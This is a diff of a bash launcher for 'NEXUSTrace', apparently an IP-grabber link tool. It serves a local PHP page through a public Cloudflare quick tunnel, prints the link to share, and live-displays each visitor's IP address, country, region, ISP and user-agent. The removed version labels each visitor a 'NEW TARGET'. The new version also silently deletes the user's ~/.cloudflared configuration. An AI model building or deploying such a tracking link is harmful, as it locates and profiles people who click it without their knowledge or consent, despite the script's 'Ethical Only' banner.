@@ -1,176 +1,126 @@
-#!/usr/bin/env bash
-set -euo pipefail
+#!/bin/bash
 
-###########################################
-# COLORS & EFFECTS
-###########################################
-RED=$(tput setaf 1)
-GRN=$(tput setaf 2)
-CYA=$(tput setaf 6)
-YLW=$(tput setaf 3)
-BLU=$(tput setaf 4)
-MAG=$(tput setaf 5)
-RST=$(tput sgr0)
-BOLD=$(tput bold)
+# ==============================
+# NEXUSTrace — Live Monitor
+# Ethical Use Only
+# ==============================
 
-###########################################
-# CONFIG
-###########################################
-HOST="127.0.0.1"
-PORT="8080"
-ROOT="$(cd "$(dirname "$0")" && pwd)"
-PHP_LOG="$ROOT/php_silent.log"
-TUNNEL_LOG="$ROOT/tunnel_silent.log"
-CAPTURE="$ROOT/capture"
-CLOUDFLARED="$ROOT/cloudflared"
-
-###########################################
-# ASCII BANNER (Colored & Centered)
-###########################################
 clear
-echo -e "${CYA}${BOLD}
+
+# -------- Colors --------
+GREEN="\e[32m"
+RED="\e[31m"
+CYAN="\e[36m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+RESET="\e[0m"
+BOLD="\e[1m"
+
+# -------- Banner --------
+echo -e "${CYAN}${BOLD}"
+cat << "EOF"
 ███╗   ██╗   ████████╗██████╗  █████╗  ██████╗███████╗
 ████╗  ██║   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
-██╔██╗ ██║█████╗██║   ██████╔╝███████║██║     █████╗  
-██║╚██╗██║╚════╝██║   ██╔══██╗██╔══██║██║     ██╔══╝  
+██╔██╗ ██║█████╗██║   ██████╔╝███████║██║     █████╗
+██║╚██╗██║╚════╝██║   ██╔══██╗██╔══██║██║     ██╔══╝
 ██║ ╚████║      ██║   ██║  ██║██║  ██║╚██████╗███████╗
-╚═╝  ╚═══╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝                                                      
-${YLW}                   N  E  X  U  S  T  R  A  C  E${RST}
-${MAG}           ─────────────────────────────────────────────${RST}
-${GRN}             Global Geolocation Beacon • Ethical Only${RST}
-${CYA}                  by CHRIZ • SKY TECH&CRAFTS${RST}
-"
+╚═╝  ╚═══╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
+EOF
+echo -e "${RESET}"
+echo -e "${YELLOW}${BOLD}N E X U S T R A C E${RESET}"
+echo -e "${GREEN}Global Geolocation Beacon · Ethical Only${RESET}"
+echo -e "${GREEN}by CHRIZ · SKY TECH&CRAFTS${RESET}\n"
 
-###########################################
-# Functions (Spinners, animations)
-###########################################
+# -------- Config --------
+HOST="127.0.0.1"
+PORT="8080"
+CLOUDFLARED="./cloudflared"
+TUNNEL_LOG="tunnel_silent.log"
+CAPTURE_LOG="capture/nexustrace.log"
 
-spinner() {
-    local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠇" "⠏")
-    while :; do
-        for f in "${frames[@]}"; do
-            printf "\r${BLU}[*]${RST} $1 ${CYA}$f${RST}"
-            sleep 0.15
-        done
-    done
-}
+# -------- Cleanup old state --------
+rm -rf ~/.cloudflared 2>/dev/null
+rm -f "$TUNNEL_LOG"
 
-flash_target() {
-    local frames=(
-        "${YLW}${BOLD}⚡ NEW TARGET ⚡${RST}"
-        "${RED}${BOLD}⚡ NEW TARGET ⚡${RST}"
-        "${CYA}${BOLD}⚡ NEW TARGET ⚡${RST}"
-    )
-    for i in {1..6}; do
-        printf "\r${frames[$((i % 3))]}"
-        sleep 0.12
-    done
-    printf "\r\033[K"
-}
-
-###########################################
-# Setup
-###########################################
-mkdir -p "$CAPTURE"
-touch "$PHP_LOG" "$TUNNEL_LOG"
-
-###########################################
-# Start PHP (Silent)
-###########################################
-spin_pid=""
-spinner "Starting PHP server..." &
-spin_pid=$!
-nohup php -S "$HOST:$PORT" -t "$ROOT" > "$PHP_LOG" 2>&1 &
+# -------- Start PHP Server --------
+php -S "$HOST:$PORT" > /dev/null 2>&1 &
+PHP_PID=$!
 sleep 1
-kill "$spin_pid" >/dev/null 2>&1 || true
-printf "\r${GRN}[✔] PHP Server Running${RST}\n"
+echo -e "${GREEN}[✓] PHP Server Running${RESET}"
 
+# -------- Download Cloudflared --------
+if [ ! -f "$CLOUDFLARED" ]; then
+  echo -e "${CYAN}[*] Downloading Cloudflared...${RESET}"
+  curl -sLo "$CLOUDFLARED" \
+  https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+  chmod +x "$CLOUDFLARED"
+fi
 
-###########################################
-# Download Cloudflared if missing
-###########################################
-if [ ! -x "$CLOUDFLARED" ]; then
-    spinner "Downloading cloudflared..." &
-    spin_pid=$!
-    curl -sLo "$CLOUDFLARED" \
-    https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
-    || true
-    chmod +x "$CLOUDFLARED" 2>/dev/null || true
-    kill "$spin_pid" >/dev/null 2>&1 || true
-    printf "\r${GRN}[✔] cloudflared Ready${RST}\n"
+echo -e "${GREEN}[✓] Cloudflared Ready${RESET}"
+
+# -------- Start Cloudflared Tunnel --------
+nohup "$CLOUDFLARED" tunnel \
+  --url "http://$HOST:$PORT" \
+  --no-autoupdate \
+  --protocol http2 \
+  > "$TUNNEL_LOG" 2>&1 &
+
+sleep 6
+echo -e "${GREEN}[✓] Tunnel Started${RESET}"
+
+# -------- Extract Public URL --------
+PUBLIC_URL=$(sed -n 's/.*\(https:\/\/[a-zA-Z0-9.-]*\.trycloudflare\.com\).*/\1/p' "$TUNNEL_LOG" | head -n 1)
+
+if [ -n "$PUBLIC_URL" ]; then
+  echo -e "${CYAN}${BOLD}[*] Public URL:${RESET} ${GREEN}$PUBLIC_URL${RESET}"
 else
-    echo -e "${GRN}[✔] cloudflared Found${RST}"
+  echo -e "${RED}[!] Tunnel running, URL not captured yet${RESET}"
 fi
 
+# -------- Prepare Live Monitor --------
+mkdir -p capture
+touch "$CAPTURE_LOG"
 
-###########################################
-# Start Tunnel (Silent)
-###########################################
-spinner "Launching Cloudflare Tunnel..." &
-spin_pid=$!
-nohup "$CLOUDFLARED" tunnel --url "http://$HOST:$PORT" --no-autoupdate > "$TUNNEL_LOG" 2>&1 &
-sleep 2
-kill "$spin_pid" >/dev/null 2>&1 || true
-printf "\r${GRN}[✔] Tunnel Started${RST}\n"
+echo -e "\n${BLUE}${BOLD}📡 LIVE CAPTURE MONITOR${RESET}"
+echo -e "${BLUE}════════════════════════════════════════${RESET}"
 
+# -------- Graceful Shutdown --------
+cleanup() {
+  echo -e "\n${RED}${BOLD}Stopping NEXUSTrace...${RESET}"
+  kill "$PHP_PID" 2>/dev/null
+  kill "$TAIL_PID" 2>/dev/null
+  pkill cloudflared 2>/dev/null
+  sleep 1
+  echo -e "${GREEN}[✓] All processes terminated${RESET}"
+  exit
+}
 
-###########################################
-# Extract trycloudflare URL
-###########################################
-spinner "Fetching Public URL..." &
-spin_pid=$!
+trap cleanup INT TERM
 
-PUBLIC_URL=""
-for _ in {1..60}; do
-    PUBLIC_URL=$(grep -Eo "https://[A-Za-z0-9.-]+\.trycloudflare\.com" "$TUNNEL_LOG" | head -n1 || true)
-    [ -n "$PUBLIC_URL" ] && break
-    sleep 0.5
-done
+# -------- Live Organized Output --------
+tail -n 0 -f "$CAPTURE_LOG" | while read -r line; do
+  case "$line" in
+    *"IP:"*)
+      echo -e "\n${MAGENTA}${BOLD}━━━━━━━━━━ New Visitor ━━━━━━━━━━${RESET}"
+      echo -e "${CYAN}🕒 Time:${RESET} ${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${RESET}"
+      echo -e "${GREEN}🌐 IP:${RESET} ${BOLD}${line#*IP: }${RESET}"
+      ;;
+    *"Country:"*)
+      echo -e "${BLUE}📍 Country:${RESET} ${line#*Country: }"
+      ;;
+    *"Region:"*)
+      echo -e "${BLUE}🏙 Region:${RESET} ${line#*Region: }"
+      ;;
+    *"ISP:"*)
+      echo -e "${CYAN}🏢 ISP:${RESET} ${line#*ISP: }"
+      ;;
+    *"User-Agent:"*)
+      echo -e "${YELLOW}🖥 User-Agent:${RESET} ${line#*User-Agent: }"
+      echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
+      ;;
+  esac
+done &
 
-kill "$spin_pid" >/dev/null 2>&1 || true
-
-if [ -z "$PUBLIC_URL" ]; then
-    echo -e "${RED}[!] Tunnel failed. Check tunnel_silent.log${RST}"
-    exit 1
-fi
-
-printf "\r${GRN}[✔] Public URL Acquired${RST}\n"
-
-
-###########################################
-# PRINT FINAL LINK
-###########################################
-echo -e "
-${CYA}${BOLD}🌍 Your Global NEXUSTRACE Link${RST}
-${MAG}──────────────────────────────────────────${RST}
-${YLW}${BOLD}$PUBLIC_URL${RST}
-${MAG}──────────────────────────────────────────${RST}
-
-${GRN}📡 Waiting for connections...${RST}
-"
-
-###########################################
-# LIVE FEED LOOP — Strips Timestamps
-###########################################
-LAST_SIZE=0
-
-while true; do
-    CUR_SIZE=$(wc -c < "$PHP_LOG" 2>/dev/null || echo 0)
-
-    if (( CUR_SIZE > LAST_SIZE )); then
-        NEW=$(tail -c +$((LAST_SIZE + 1)) "$PHP_LOG")
-
-        # Remove annoying PHP server timestamps:
-        CLEAN=$(echo "$NEW" | sed 's/^\[[^]]*\] //')
-
-        # If this is a NEXUSTRACE hit → show flash + content
-        if echo "$CLEAN" | grep -q "NEXUS TRACE — NEW ACTIVITY"; then
-            flash_target
-            echo -e "${YLW}${BOLD}$CLEAN${RST}"
-        fi
-
-        LAST_SIZE=$CUR_SIZE
-    fi
-
-    sleep 0.15
-done
+TAIL_PID=$!
+wait
